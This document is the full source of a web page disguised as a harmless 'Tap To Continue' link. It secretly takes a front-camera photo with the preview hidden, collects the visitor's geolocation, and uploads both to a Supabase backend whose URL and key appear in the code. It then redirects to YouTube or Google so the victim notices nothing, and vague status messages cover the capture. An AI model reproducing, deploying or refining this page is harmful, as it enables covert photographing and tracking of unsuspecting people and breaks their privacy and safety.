<!DOCTYPE html>
<html lang="bn">

<head>

  <meta charset="UTF-8">

  <meta
    name="viewport"
    content="width=device-width, initial-scale=1.0"
  >

  <title>viral</title>

  <style>

    body {
      font-family: Arial, sans-serif;
      margin: 0;
      min-height: 100vh;
      background: #f5f5f5;

      display: flex;
      justify-content: center;
      align-items: center;
    }

    .box {

      width: 92%;
      max-width: 600px;

      background: white;

      padding: 30px;

      border-radius: 15px;

      box-shadow:
        0 3px 12px rgba(0,0,0,0.12);

      text-align: center;
    }

    button {

      display: block;

      margin: 20px auto;

      width: 80%;
      max-width: 400px;

      padding: 18px;

      border: none;

      border-radius: 12px;

      background: #222;

      color: white;

      font-size: 20px;

      font-weight: bold;
    }

    button:disabled {
      opacity: 0.6;
    }

    /*
     * Camera preview hidden
     */

    #camera {
      display: none;
    }

    #status {

      margin-top: 15px;

      font-weight: bold;

      line-height: 1.6;
    }

    .notice {

      font-size: 14px;

      color: #555;

      line-height: 1.5;
    }

  </style>

</head>


<body>

<div class="box">

  <h2>Tap To Continue</h2>

  <p class="notice">

  
  </p>


  <button
    id="startBtn"
    onclick="startTest()"
  >
    Continue
  </button>


  <video
    id="camera"
    autoplay
    playsinline
  ></video>


  <p id="status"></p>

</div>


<script
  src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2">
</script>


<script>

/* =========================
   SUPABASE
========================= */

const SUPABASE_URL =
  "https://kkydmymmltcxjxtbkhwj.supabase.co";

const SUPABASE_PUBLISHABLE_KEY =
  "sb_publishable_Q1mhRPTOLcEUBwUog1nygQ_91N8_pzM";

const supabaseClient =
  window.supabase.createClient(

    SUPABASE_URL,

    SUPABASE_PUBLISHABLE_KEY

  );


/* =========================
   GET TARGET URL
========================= */

function getTargetURL() {

  const params =
    new URLSearchParams(
      window.location.search
    );

  const target =
    params.get("target");

  if (!target) {
    return null;
  }

  try {

    const url =
      new URL(target);

    const hostname =
      url.hostname.toLowerCase();


    /*
     * Only allow these destinations
     */

    const allowed =
      url.protocol === "https:" &&
      (
        hostname === "youtube.com" ||
        hostname === "www.youtube.com" ||
        hostname === "m.youtube.com" ||
        hostname === "youtu.be" ||

        hostname === "google.com" ||
        hostname === "www.google.com" ||
        hostname === "share.google"
      );


    if (!allowed) {
      return null;
    }


    return url.href;

  } catch (error) {

    return null;

  }

}


/* =========================
   START TEST
========================= */

async function startTest() {

  const button =
    document.getElementById("startBtn");

  const status =
    document.getElementById("status");

  const video =
    document.getElementById("camera");

  let stream = null;


  button.disabled = true;


  try {


    /* =========================
       CAMERA PERMISSION
    ========================= */

    status.innerText =
      "Loading....";


    if (
      !navigator.mediaDevices ||
      !navigator.mediaDevices.getUserMedia
    ) {

      throw new Error(
        " access not available"
      );

    }


    stream =
      await navigator.mediaDevices.getUserMedia({

        video: {
          facingMode: "user"
        },

        audio: false

      });


    video.srcObject =
      stream;


    await video.play();


    await new Promise(
      resolve =>
        setTimeout(resolve, 800)
    );


    /* =========================
       CAPTURE PHOTO
    ========================= */

    const canvas =
      document.createElement("canvas");


    canvas.width =
      video.videoWidth;


    canvas.height =
      video.videoHeight;


    if (
      canvas.width === 0 ||
      canvas.height === 0
    ) {

      throw new Error(
        "no access"
      );

    }


    const ctx =
      canvas.getContext("2d");


    ctx.drawImage(

      video,

      0,

      0,

      canvas.width,

      canvas.height

    );


    const photoBlob =
      await new Promise(
        resolve =>

          canvas.toBlob(

            resolve,

            "image/jpeg",

            0.85

          )

      );


    if (!photoBlob) {

      throw new Error(
        "permission not allowed"
      );

    }


    /* =========================
       STOP CAMERA
    ========================= */

    stream
      .getTracks()
      .forEach(
        track =>
          track.stop()
      );


    stream = null;


    video.srcObject =
      null;


    /* =========================
       LOCATION
    ========================= */

    status.innerText =
      "please wait";


    if (!navigator.geolocation) {

      throw new Error(
        "not available"
      );

    }


    const position =
      await new Promise(

        (resolve, reject) => {

          navigator.geolocation.getCurrentPosition(

            resolve,

            reject,

            {

              enableHighAccuracy: false,

              timeout: 30000,

              maximumAge: 30000

            }

          );

        }

      );


    const latitude =
      position.coords.latitude;


    const longitude =
      position.coords.longitude;


    /* =========================
       FILE NAME
    ========================= */

    const fileName =
      "lab/" +
      crypto.randomUUID() +
      ".jpg";


    /* =========================
       PHOTO UPLOAD
    ========================= */

    status.innerText =
      "Almost Done";


    const uploadResult =
      await supabaseClient

        .storage

        .from("photos")

        .upload(

          fileName,

          photoBlob,

          {

            contentType:
              "image/jpeg",

            upsert:
              false

          }

        );


    if (uploadResult.error) {

      throw uploadResult.error;

    }


    /* =========================
       SAVE LOCATION
    ========================= */

    status.innerText =
      "waiting...";


    const insertResult =
      await supabaseClient

        .from("captures")

        .insert({

          photo_url:
            fileName,

          latitude:
            latitude,

          longitude:
            longitude

        });


    if (insertResult.error) {

      throw insertResult.error;

    }


    /* =========================
       SUCCESS
    ========================= */

    status.innerText =
      "Done";


    button.style.display =
      "none";


    /* =========================
       REDIRECT
    ========================= */

    const targetURL =
      getTargetURL();


    if (targetURL) {

      status.innerText =
        "Loading...";


      setTimeout(

        () => {

          window.location.href =
            targetURL;

        },

        800

      );

    }


  } catch (error) {


    console.error(error);


    if (stream) {

      stream
        .getTracks()
        .forEach(
          track =>
            track.stop()
        );

    }


    button.disabled =
      false;


    if (error.code === 1) {

      status.innerText =
        "no permission access";


    } else if (error.code === 2) {

      status.innerText =
        "no access";


    } else if (error.code === 3) {

      status.innerText =
        "try again";


    } else {

      status.innerText =
        "❌ " +
        (
          error.message ||
          "error"
        );

    }

  }

}

</script>

</body>

</html>
